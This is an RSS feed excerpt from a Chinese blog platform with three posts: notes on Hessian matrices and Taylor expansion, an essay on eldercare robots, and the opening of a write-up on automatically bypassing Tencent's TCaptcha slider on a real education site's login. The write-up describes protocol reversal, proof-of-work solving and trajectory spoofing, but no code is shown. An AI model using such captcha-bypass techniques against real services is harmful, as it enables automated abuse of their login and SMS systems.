{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "凸优化数学基础笔记（四）：Hessian 矩阵及 Taylor 展开",
      "link": "https://www.cnblogs.com/GeophysicsWorker/p/19624189",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/GeophysicsWorker/p/19624189\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 09:48\">\n    <span>凸优化数学基础笔记（四）：Hessian 矩阵及 Taylor 展开</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        上一节说过，梯度 $\\nabla f(\\mathbf{X})$ 是$f(\\mathbf{X})$ 关于$\\mathbf{X}$ 的一阶导数，现在一个问题$f(\\mathbf{X})$ 关于 $\\mathbf{X}$ 的二阶导数是什么？Hessian 矩阵（海森矩阵）是一个多变量实值函数$f(\\mathbf{X})$的二阶导数构成得方阵，其几何意义是描述了一个多元函数或场函数的局部曲率。在机器学习、优化问题和物理反演问题中，Hessian矩阵扮演着重要的角色，尤其是在寻找函数的极值点（如损失函数或目标函数的最小值）和分析系统的稳定性。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1hessian矩阵定义及性质\">1.Hessian矩阵定义及性质</h2>\n<p>​\t在上一节说过，梯度 <span class=\"math inline\">\\(\\nabla f(\\mathbf{X})\\)</span> 是<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 关于<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 的一阶导数，现在一个问题<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 关于 <span class=\"math inline\">\\(\\mathbf{X}\\)</span> 的二阶导数是什么？Hessian 矩阵（海森矩阵）是一个多变量实值函数<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span>的二阶导数构成得方阵，其几何意义是描述了一个多元函数或场函数的局部曲率。在机器学习、优化问题和物理反演问题中，Hessian矩阵扮演着重要的角色，尤其是在寻找函数的极值点（如损失函数或目标函数的最小值）和分析系统的稳定性。下面是关于Hessian矩阵的详细介绍：</p>\n<p>​\t<strong>Definition 4.1.1</strong>  设<span class=\"math inline\">\\(f:\\mathbb{R}^n\\rightarrow{\\mathbb{R}}\\)</span> , <span class=\"math inline\">\\(\\mathbf{X}\\in{R}^n\\)</span> ,如果<span class=\"math inline\">\\(f\\)</span>在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处对于自变量<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 的各个分量<span class=\"math inline\">\\(x_i,x_j\\)</span> 的二阶偏导</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part{f(\\mathbf{X}_0)}}{\\part{x_i}\\part{x_j}} \t\t\\hspace{2em} (i,j=1,2,...,n)\n\\]</div><p></p><p>都存在，则称函数<span class=\"math inline\">\\(f\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处二阶可导，并且称矩阵：</p>\n<p></p><div class=\"math display\">\\[\\nabla^2f(\\mathbf{X}_0)=\\left(\\begin{matrix}\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1^2}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_n}}\\\\ \n\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_2}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_2^2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_2}\\part{x_n}}\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\\n\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}\\part{x_1}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}\\part{x_2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}^2}\n\\end{matrix}\\right)\n\\tag{2}\n\\]</div><p></p><p>是<span class=\"math inline\">\\(f\\)</span>在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处的<strong>Hessian矩阵</strong>，记为<span class=\"math inline\">\\(\\mathbf{H}_{ij}=\\frac{\\part^2{f}}{\\part{x_i}\\part{x_j}}\\)</span>。</p>\n<p>​\t在数学分析中已经知道，当<span class=\"math inline\">\\(f\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处的所有二阶偏导数为连续时有：</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_i}\\part{x_j}}=\\frac{\\part^2{f(\\mathbf{X}_0)}}{\\part{x_j}\\part{x_i}} \\tag{3}\n\\]</div><p></p><p>因此，在这种情况下Hessian矩阵是<strong>对称矩阵</strong>。</p>\n<p><strong>推论 1</strong> 设<span class=\"math inline\">\\(\\mathbf{a}\\in{\\mathbf{R}^n},\\mathbf{X}\\in{\\mathbf{R}^n},b\\in{R}\\)</span>，求线性函数：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X})=\\mathbf{a}^T\\mathbf{X}+b\\tag{4}\n\\]</div><p></p><p>在任意点<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 处的梯度向量和Hessian矩阵：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;\\nabla{f(\\mathbf{X})}=\\mathbf{a}\\\\\n&amp;\\nabla^2{f(\\mathbf{X})}=\\mathbf{0}\n\\end{aligned}\n\\tag{5}\n\\]</div><p></p><p><strong>证  明：</strong> 设<span class=\"math inline\">\\(\\mathbf{a}=[a_1,a_2,\\cdots,a_n]^{T},\\mathbf{X}=[x_1,x_2,\\cdots,x_n]^{T}\\)</span> 则：</p>\n<p></p><div class=\"math display\">\\[f(x_1,x_2,\\cdots,x_n)=\\sum^{n}_{i=1}a_ix_i+b \\tag{6}\n\\]</div><p></p><p>根据梯度向量<span class=\"math inline\">\\(\\nabla{f}\\)</span>的定义：</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\frac{\\part{f}}{\\part{x_i}}=a_i \\hspace{2em} (i=1,2,\\cdots,n) \\tag{7}\n\\]</div><p></p><p>由式（7）可知，</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=[a_1,a_2,\\cdots,a_n]^T=\\mathbf{a} \\tag{8}\n\\]</div><p></p><p>根据式（2）的<span class=\"math inline\">\\(Hessian\\)</span>矩阵的定义：</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part^2{f}}{\\part{x_i}\\part{x_j}}=0, \\hspace{2em} i,j=1,2,\\cdots,n \\tag{9}\n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[\\nabla^2{f(\\mathbf{X})}=\\mathbf{0} \\tag{10}\n\\]</div><p></p><p><strong>推论  2</strong>  设<span class=\"math inline\">\\(\\mathbf{A}\\in{R^{n\\times{n}}}\\)</span> 是对称实方阵，<span class=\"math inline\">\\(\\mathbf{b}\\in{\\mathbf{R}^n},c\\in\\mathbf{R}^1\\)</span> ,其二次函数<span class=\"math inline\">\\(f(\\mathbf{X})=\\frac{1}{2}\\mathbf{X}^T\\mathbf{A}\\mathbf{X}+\\mathbf{b}^T\\mathbf{X}+c\\)</span> ,在任意点处的梯度向量<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X})}\\)</span> 及Hessian矩阵 <span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X})\\)</span> 为如下形式：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;\\nabla{f}=\\mathbf{AX+b} \\\\\n&amp;\\nabla^2{f}=\\mathbf{A}\n\\end{aligned}\n\\tag{11}\n\\]</div><p></p><p><strong>证 明：</strong> 设<span class=\"math inline\">\\(\\mathbf{A}=[a_{ij}]_{n\\times{n}}\\)</span> ,<span class=\"math inline\">\\(\\mathbf{X}=[x_1,x_2,...,x_n]^T\\)</span>, <span class=\"math inline\">\\(\\mathbf{b}=[b_1,b_2,...,b_n]^T\\)</span> ,二次函数<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 可以写成如下形式：</p>\n<p></p><div class=\"math display\">\\[f(x_1,x_2,\\cdots,x_n)=\\frac{1}{2}\\sum_{i=1}^{n}\\sum_{j=1}^{n}a_{ij}x_ix_j+\\sum_{i=1}^{n}b_ix_i+c \\tag{12}\n\\]</div><p></p><p>将它对各个变量 <span class=\"math inline\">\\(x_i\\)</span> (<span class=\"math inline\">\\(i=1,\\cdots,n\\)</span>) 求偏导数，得到：</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\left( \\begin{matrix} \\sum_{j=1}^n a_{1j}x_j+b_1\\\\\n\\vdots \\\\\\sum_{j=1}^{n}a_{n_j}x_j+b_n \\end{matrix} \\right)= \\left(\\begin{matrix}\\sum_{j=1}^{n}a_{1j}x_j\\\\\\vdots\\\\\\sum_{j=1}^na_{nj}x_j\\end{matrix}\\right)+\\left(\\begin{matrix}b_1\\\\ \\vdots \\\\b_n\\end{matrix}\\right) \\tag{13}\n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\mathbf{AX+b} \\tag{14}\n\\]</div><p></p><p>再对它们的求偏导数是：</p>\n<p></p><div class=\"math display\">\\[ \\frac{\\part{f(\\mathbf{X})}}{\\part{x_i}\\part{x_j}}=a_{ij} \\tag{15}\n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[\\nabla^2f(\\mathbf{X})=\\mathbf{A} \\tag{16}\n\\]</div><p></p><p>以上两个例子说明，<span class=\"math inline\">\\(n\\)</span>元函数求导与一元函数求导在形式上一致的，即线性函数的一阶导数的求导为常向量，其二阶导数为零矩阵；而二次函数的一阶导数为线性向量函数， 其二阶导数为常矩阵。</p>\n<p>​\t在此介绍在今后的计算中要用到的向量函数的导数。</p>\n<p>​\t<strong>Definition 4.1.2</strong> 设一个向量函数<span class=\"math inline\">\\(h:R^{n}\\rightarrow{R^m}，\\mathbf{X}_0\\in{R^n}\\)</span>，记<span class=\"math inline\">\\(h(\\mathbf{X})=\\{h_1(\\mathbf{X}),h_2(\\mathbf{X}),\\cdots,h_m(\\mathbf{X})\\}^T\\)</span>，如果<span class=\"math inline\">\\(h_i(i=1,2,\\cdots,m)\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处对于自变量<span class=\"math inline\">\\(\\mathbf{X}=[x_1,x_2,x_3,\\cdots,x_n]^T\\)</span> 的各分量的偏导数<span class=\"math inline\">\\(\\frac{\\part{h_i(\\mathbf{X}_0)}}{\\part{x_j}}\\space(j=1,2,3,\\cdots,m)\\)</span> 都存在，则称向量函数<span class=\"math inline\">\\(h(\\mathbf{X})\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处是一阶可导的，并且称矩阵：</p>\n<p></p><div class=\"math display\">\\[\\nabla_{m\\times{n}}h(\\mathbf{X}_0)=\\left[\\begin{matrix} \\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_1}} &amp;\\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_n}} \\\\ \\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_1}} &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_n}}\\\\ \\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\ \\frac{\\part{h_m(\\mathbf{X}_0)}}{\\part{x_1}}   &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_n}} \\end{matrix}\\right] \\tag{17}\n\\]</div><p></p><p>是<span class=\"math inline\">\\(h\\)</span>在点<span class=\"math inline\">\\(X_0\\)</span> 处的一阶导数或Jacobi 矩阵，简记为</p>\n<p></p><div class=\"math display\">\\[\\nabla{\\mathbf{h}(\\mathbf{X}_0)}=\\nabla_{m\\times{n}}\\mathbf{h}(\\mathbf{X}_0) \\tag{18}\n\\]</div><p></p><p>由于<span class=\"math inline\">\\(n\\)</span>元函数<span class=\"math inline\">\\(f:\\mathbf{R}^n\\rightarrow \\mathbf{R}^1\\)</span> 的梯度是向量函数:</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\left[\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}},...,\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right]^T \n\\tag{19}\n\\]</div><p></p><p>所以<span class=\"math inline\">\\(\\nabla f(\\mathbf{X})\\)</span> 的一阶导数或Jacobi 矩阵为：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n\\nabla_{n\\times{n}}\\nabla{f(\\mathbf{X})}&amp;=\\left[\\begin{matrix}\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right) &amp;\\cdots &amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right)\\\\\n\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right) &amp;\\cdots &amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right)\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\\n\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right) &amp;\\cdots &amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right)\n\\end{matrix}\\right]\\\\\n&amp;=\\left[\\begin{matrix}\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1^2}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_2}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_n}}\\\\\n\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_2}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2^2}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2x_n}}\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots\\\\\n\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_n}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2x_n}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_n^2}}\n\\end{matrix}\\right]\\\\\n&amp;=\\nabla^2{f(\\mathbf{X})}\n\\end{aligned}\n\\tag{20}\n\\]</div><p></p><p>即：</p>\n<p></p><div class=\"math display\">\\[\\nabla_{n\\times{n}}\\nabla{f(\\mathbf{X})}=\\nabla^2f(\\mathbf{X}) \\tag{21}\n\\]</div><p></p><p>据此，从上式的得知，函数梯度的Jacobi的矩阵为此函数<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 的Hessian矩阵。</p>\n<p>下面给出常用Jacobi矩阵的几个公式和推论：</p>\n<ol>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{c}_{n\\times1}}=\\mathbf{0}_{n\\times{n}}\\)</span> ，其中<span class=\"math inline\">\\(\\mathbf{c}\\)</span> 是分量全部为常量的<span class=\"math inline\">\\(n\\)</span>维向量，<span class=\"math inline\">\\(\\mathbf{0}\\)</span> 是<span class=\"math inline\">\\(n\\times{n}\\)</span> 阶零向量；</li>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{X}}=\\mathbf{I}\\)</span>，其中<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 是<span class=\"math inline\">\\(n\\)</span>维向量，<span class=\"math inline\">\\(I\\)</span> 为<span class=\"math inline\">\\(n\\times{n}\\)</span> 阶单位矩阵；</li>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{AX}}=\\mathbf{A}^T\\)</span>，其中<span class=\"math inline\">\\(\\mathbf{A}\\)</span>是<span class=\"math inline\">\\(m\\times{n}\\)</span>阶矩阵；</li>\n<li>设 <span class=\"math inline\">\\(\\phi{(t)}=f(\\mathbf{X}_0+t\\mathbf{P})\\)</span>，其中<span class=\"math inline\">\\(f:\\mathbf{R}^n\\rightarrow\\mathbf{R}^{1}\\)</span>, <span class=\"math inline\">\\(\\phi:\\mathbf{R}\\rightarrow\\mathbf{R}\\)</span>，则<span class=\"math inline\">\\(\\phi^{\\prime}(t)=\\nabla f(\\mathbf{X}_0+t\\mathbf{P})^T\\mathbf{P}\\)</span>, <span class=\"math inline\">\\(\\phi^{\\prime\\prime}=\\mathbf{P}^T\\nabla^2{f(\\mathbf{X}_0+t\\mathbf{P})}\\mathbf{P}\\)</span></li>\n</ol>\n<h2 id=\"2多元函数的taylor展开\">2.多元函数的Taylor展开</h2>\n<p>​\t多元函数的Taylor展开式在最优化方法中是十分重要的，许多方法及其收敛方法的证明是从其出发，这里给出Taylor展开定理及其证明。Taylor展开近似可以有效地将复杂函数化为二次函数。</p>\n<p>​\t<strong>定 理 4.2.1</strong> 设<span class=\"math inline\">\\(f:\\mathbf{R}^{n}\\rightarrow\\mathbf{R}\\)</span> 具有二阶连续偏导数，则</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^T\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\overline{\\mathbf{X}})\\mathbf{P} \\tag{22}\n\\]</div><p></p><p>其中：<span class=\"math inline\">\\(\\overline{\\mathbf{X}}=\\mathbf{X}+\\theta\\mathbf{P}(\\theta\\in{(0,1)})\\)</span>。</p>\n<p><strong>证  明</strong>：设 <span class=\"math inline\">\\(\\psi(t)=f(\\mathbf{X}+t\\mathbf{P})\\)</span> 其中 <span class=\"math inline\">\\(t\\in[0,1]\\)</span>:</p>\n<p></p><div class=\"math display\">\\[\\psi(0)=f(\\mathbf{X}) ， \\psi(1)=f(\\mathbf{X}+\\mathbf{P}) \\tag{23}\n\\]</div><p></p><p>对<span class=\"math inline\">\\(\\psi(t)\\)</span> 按照一元函数在<span class=\"math inline\">\\(t=0\\)</span>点展开，得到下式：</p>\n<p></p><div class=\"math display\">\\[   \\psi(t)=\\psi(0)+\\psi^{\\prime}(0)t+\\frac{1}{2}\\psi^{\\prime\\prime}(\\theta t)t^2 \\tag{24}\n\\]</div><p></p><p>其中 <span class=\"math inline\">\\(\\theta\\in(0,1)\\)</span>。令<span class=\"math inline\">\\(t=1\\)</span>，于是</p>\n<p></p><div class=\"math display\">\\[\\psi(1)=\\psi(0)+\\psi^{\\prime}(0)+\\frac{1}{2}\\psi^{\\prime\\prime}(\\theta) \\tag{25}\n\\]</div><p></p><p>又因为上节中 <span class=\"math inline\">\\(\\psi^{\\prime}(\\theta)=\\nabla{f(\\mathbf{X})}^T\\mathbf{P},\\psi^{\\prime\\prime}(\\theta)=\\mathbf{P}^T\\nabla^2f(\\mathbf{X}+\\theta{\\mathbf{P}})\\mathbf{P}\\)</span> ，代入式（25）中得到：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^T\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\mathbf{X}+\\theta\\mathbf{P})\\mathbf{P} \\tag{26}\n\\]</div><p></p><p>式（26）还可以写成：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^{T}\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\mathbf{X})\\mathbf{P}+o(||\\mathbf{P}||^2) \\tag{27}\n\\]</div><p></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 09:48</span>&nbsp;\n<a href=\"https://www.cnblogs.com/GeophysicsWorker\">GeoFXR</a>&nbsp;\n阅读(<span id=\"post_view_count\">12</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "从春晚机器人，看中国未来百年的养老之路",
      "link": "https://www.cnblogs.com/xdesigner/p/19621864",
      "published": "",
      "description": "<h2>\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xdesigner/p/19621864\" id=\"cb_post_title_url\" title=\"发布于 2026-02-17 19:03\">\n    <span>从春晚机器人，看中国未来百年的养老之路</span>\n    \n\n</a>\n\n\t\t</h2>\n\t\t<div class=\"postText\">    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        未来一百年，中国会走一条：人口适度、科技强大、产业高效、养老普惠的道路。科技让生活更安稳，让养老更有尊严，让国家发展更可持续。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"从春晚机器人看中国未来百年的养老之路\">从春晚机器人，看中国未来百年的养老之路</h1>\n<p>2026年春晚的武术机器人节目，整齐划一的动作、稳定的平衡能力，让人印象深刻。节目播出后，社交媒体上出现大量热议。一个突出的声音是，不少年轻人留言并相互回复讨论：“以后不生小孩了，把钱存起来，等老了直接买机器人养老。”</p>\n<p>这话乍听像玩笑，细想却很有深意。它触及了一个正在发生的根本变化：当科技足够先进，传统的“养儿防老”模式，正在被一种新的可能所替代。但这种替代不会一蹴而就——在机器人真正普及之前，中国将面临一个10到20年的“危险平衡期”。</p>\n<h2 id=\"一未富先老我们面临的现实压力\">一、未富先老：我们面临的现实压力</h2>\n<p>春晚机器人展示的运动控制和精准操作能力，恰恰是养老场景中最需要的技术。但问题的紧迫性在于，老龄化正在加速，而机器人技术尚未完全成熟。</p>\n<p>一组数据可以说明现状：目前我国60岁及以上人口已达3.1亿，占总人口的22%。其中失能老人约3500万，而专业护理员的缺口超过500万人。预计到2030年，60岁以上人口将增至3.9亿，老龄化水平接近28%。</p>\n<p>与发达国家“先富后老”不同，中国是“未富先老”——人均GDP刚突破1.2万美元，就迎来了深度老龄化。这意味着，社会财富积累不足，养老金体系压力巨大，而可用的年轻劳动力正在减少。</p>\n<h2 id=\"二最危险的十年2026-2035年的动态平衡\">二、最危险的十年：2026-2035年的动态平衡</h2>\n<p>这是整个百年进程中最关键的阶段，也是一个脆弱的平衡期。</p>\n<p><strong>压力来自三个方面：</strong><br />\n第一，1960-1975年出生的人口高峰正在集中进入退休和需要照护的阶段，养老服务需求爆发式增长。<br />\n第二，机器人技术尚未成熟。目前的人形机器人成本在10万-20万元一台，且只能完成辅助性工作，无法替代复杂护理。大规模普及至少要等到2030年以后。<br />\n第三，生育率已经跌破1.1，进入全球最低行列。这意味着后续劳动人口补给严重不足。</p>\n<p><strong>这个阶段的风险在于：</strong></p>\n<ul>\n<li>养老金收支缺口扩大，部分地区可能面临支付压力</li>\n<li>护理人力短缺导致服务质量下降，失能老人照护出现真空</li>\n<li>年轻人既要赡养老人，又面临就业压力，生育意愿进一步走低</li>\n<li>机器人服务成本仍然偏高，普通家庭难以负担</li>\n</ul>\n<p>这是一个动态平衡：机器人开始进入养老场景，但替代率不足；人口老龄化加速，但社会转型尚未完成。稍有应对失当，就可能出现系统性压力。</p>\n<h2 id=\"三度过危险期未来百年的三阶段演进\">三、度过危险期：未来百年的三阶段演进</h2>\n<h3 id=\"2035-2050机器人普及期\">2035-2050：机器人普及期</h3>\n<p>生育率预计在1.1-1.2之间，总人口从14亿逐步回落至12亿左右。养老机器人市场已进入快速增长通道：从2023年的66亿元，预计到2029年增至159亿元，2030年后增速进一步加快。这一阶段的机器人从辅助走向主力——2035年前后，成本有望降至5万元以内，月租模式开始普及。机器人服务开始实质性分担养老压力。</p>\n<h3 id=\"2050-2080机器人成熟期\">2050-2080：机器人成熟期</h3>\n<p>生育率回升至1.2-1.3的安全区间，人口稳定在9亿-10亿。机器人替代70%-80%的基础劳动，人形机器人可以完成全流程照护。市场规模进入万亿级别，单台机器人成本降至1万-3万元，或者月租两三千元。长期护理保险全面覆盖，养老服务实现标准化、普惠化。</p>\n<h3 id=\"2080-2126智能文明期\">2080-2126：智能文明期</h3>\n<p>生育率保持在1.0-1.2，人口稳定在6亿-8亿。机器人替代90%以上的重复性劳动，与通用AI深度融合，不仅能照顾身体，还能精神陪伴、预判健康问题。机器人即服务（RaaS）模式普及，个人存款、养老金、商业保险共同支付机器人服务，养老成本进一步降低。</p>\n<h2 id=\"四十万亿级产业支撑养老闭环\">四、十万亿级产业，支撑养老闭环</h2>\n<p>这一切的根基是机器人产业。目前智能巡检机器人市场规模已超230亿元，核心零部件国产化率超60%，成本持续下降。养老机器人产业链与人形机器人高度协同，远期潜在市场空间超万亿元。</p>\n<p>支付端也在逐步完善：基本养老保险、长期护理保险、商业养老金融构成三重保障。机器人产业越成熟，养老成本越低，科技进步的红利最终会落到普通人身上。</p>\n<h2 id=\"五守住底线个人选择与国家战略的平衡\">五、守住底线：个人选择与国家战略的平衡</h2>\n<p>回到开头那些年轻人的热议——“不生娃、存钱买机器人养老”。从个人角度，这是一个理性的选择，不值得指责。但国家必须守住一条底线：生育率需要维持在1.2左右，确保有足够的人口支撑研发、运维和创新。</p>\n<p>度过未来十年的危险平衡期，需要三管齐下：一是加快机器人技术研发和成本下降，二是完善长期护理保险和养老金体系，三是适当鼓励生育守住人口安全线。</p>\n<p>未来的社会，将是多元共生的格局：一部分家庭生育，守住人口基础；一部分人储蓄，享受科技红利；机器人填补劳动力缺口。个人选择与国家发展不是对立的，而是互补的。</p>\n<p>春晚那几个打拳舞剑的机器人，打开的不仅是一个节目的窗口。它预示着一个由科技驱动、效率支撑、资金保障、人口托底的新时代。但通向这个时代的路上，有十年左右的艰难平衡期需要跨越。跨过去，就是科技让生活更安稳、让养老更有尊严、让国家发展更可持续的未来。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n</div>\n\t\t<p class=\"postfoot\">\n\t\t\tposted on \n<span id=\"post-date\">2026-02-17 19:03</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xdesigner\">袁永福 电子病历，医疗信息化</a>&nbsp;\n阅读(<span id=\"post_view_count\">218</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n\t\t</p>"
    },
    {
      "title": "攻克腾讯 TCaptcha 滑块验证码：纯 HTTP 协议逆向实战",
      "link": "https://www.cnblogs.com/han5562877/p/19621722/overcoming-tencent-tcaptcha-208tlo",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/han5562877/p/19621722/overcoming-tencent-tcaptcha-208tlo\" id=\"cb_post_title_url\" title=\"发布于 2026-02-17 17:25\">\n    <span>攻克腾讯 TCaptcha 滑块验证码：纯 HTTP 协议逆向实战</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本文记录了一次对腾讯 TCaptcha 滑块验证码的完整逆向工程实践，以粉笔教育登录流程为研究对象，通过纯 HTTP 协议实现了全自动化破解，通过率达到 100%。\n核心挑战包括：三阶段协议完整还原、NCC 模板匹配算法优化、PoW 工作量证明高效求解，以及 TDC.js 混淆虚拟机的执行与行为轨迹仿真。\n逆向从 HAR 抓包入手，梳理出风控触发后业务系统返回 contextId、前端加载腾讯验证码 iframe、用户验证成功后获取 ticket 和 randstr、再提交 captcha/check 解除风控的完整链路。验证码系统与业务系统解耦，可独立攻克 TCaptcha 后将凭证提交业务接口即可。\n同时还原了发送短信验证码接口所需的 RSA/ECB/PKCS#1 v1.5 加密 info 字段（手机号+时间戳），并用纯 Python 实现了标准填充的加密过程。\n本文为后续协议分析、图像处理、算法设计和虚拟机执行等环节奠定了基础，最终构建出一套稳定、可复用的纯 HTTP 自动化解决方案。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"攻克腾讯-tcaptcha-滑块验证码纯-http-协议逆向实战\">攻克腾讯 TCaptcha 滑块验证码：纯 HTTP 协议逆向实战</h1>\n<p>本文记录了一次完整的验证码逆向工程实践，从协议分析、图像处理、算法设计到 JavaScript VM 执行，最终实现了对腾讯 TCaptcha 滑块验证码的全自动化破解，通过率达到 100%。</p>\n<h2 id=\"一技术挑战概述\">一、技术挑战概述</h2>\n<p>腾讯 TCaptcha 